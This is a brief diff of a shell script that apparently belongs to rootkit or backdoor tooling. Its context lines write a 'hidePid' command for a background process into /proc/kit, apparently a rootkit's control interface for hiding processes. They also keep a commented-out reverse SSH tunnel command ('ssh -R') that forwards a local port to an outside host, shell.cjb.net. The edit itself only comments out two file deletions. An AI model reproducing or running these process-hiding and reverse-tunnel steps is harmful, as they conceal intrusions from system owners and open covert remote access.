@@ -20,8 +20,10 @@ backgroundPID=$!
 echo "hidePid $backgroundPID" > /proc/kit
 
 sleep 1
-rm fromBash
-rm toBash
+#rm fromBash
+#rm toBash
+
+#given this direcory is removed removing the individual files does not need to be done
 
 #ssh -R 9012:localhost:$localPort kit100@shell.cjb.net 
 
